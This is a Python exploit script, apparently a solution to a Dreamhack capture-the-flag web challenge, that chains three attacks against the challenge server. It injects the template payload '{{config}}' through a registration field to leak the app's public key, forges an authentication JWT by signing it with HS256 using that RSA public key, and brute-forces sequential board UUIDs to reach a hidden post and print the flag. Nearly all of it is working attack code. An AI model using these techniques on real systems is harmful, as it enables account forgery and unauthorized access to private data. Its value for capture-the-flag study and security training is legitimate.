import random
import string
import datetime

import requests
import jwt

s = requests.Session()
info = lambda x: print(f"[+] {x}")

URL = "http://host1.dreamhack.games:15967/"
USERNAME = "".join([random.choice(string.ascii_lowercase) for _ in range(10)])
PASSWORD = "".join([random.choice(string.ascii_lowercase) for _ in range(10)])
SCHOOL = "드림대학교"


info(f"USERNAME: {USERNAME}, PASSWORD: {PASSWORD}")


# 1. SSTI
# 1.1. Register with malicious school name, "{{config}}"
s.post(
    f"{URL}/register",
    data={
        "username": USERNAME,
        "password": PASSWORD,
        "password_confirm": PASSWORD,
        "school": "{{config}}",
    },
)

s.post(
    f"{URL}/login",
    data={
        "username": USERNAME,
        "password": PASSWORD,
    },
)

# 1.2. Access 404 page to trigger SSTI.
res = s.get(f"{URL}/none")

# 1.3. Get public key.
pubkey = (
    res.text.split("AUTH_PUBLIC_KEY&#39;: b&#39;")[1]
    .split("&#39;")[0]
    .replace("\\n", "\n")
)

info(f"Public Key:\n{pubkey}")

# 2. JWT
# 2.1. Encode JWT via HS256 with taken token.
# Note that encode token with public key is available at version 0.4.3 (PyJWT)
token = jwt.encode(
    {
        "username": USERNAME,
        "school": SCHOOL,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=10),
    },
    pubkey,
    algorithm="HS256",
).decode()

s.cookies.set("token", token)
info(f"JWT: {token}")


# 3. UUID
# 3.1. Get UUID of free board.
res = s.get(f"{URL}/s/{SCHOOL}")
free_board_id = res.text.split(f'<a class="title" href="/s/{SCHOOL}/')[1].split(
    '">자유게시판</a>'
)[0]

info(f"FREE BOARD ID: {free_board_id}")


# 3.2. Brute force secret board's ID
def uuid(num: int) -> str:
    return f"{hex(int(free_board_id.split('-')[0], 16) + num)[2:]}-{'-'.join(free_board_id.split('-')[1:])}"


for counter in range(1, 600):
    res = s.get(f"{URL}/s/{SCHOOL}/{uuid(counter)}")
    info(f"({counter:4}) {uuid(counter)}, {res.status_code}")

    if res.status_code != 404:
        break

res = s.get(URL + res.text.split('<a class="post-list-elem" href="')[1].split('"')[0])
info(f"FLAG: " + res.text.split('<p class="content">')[1].split("</p>")[0])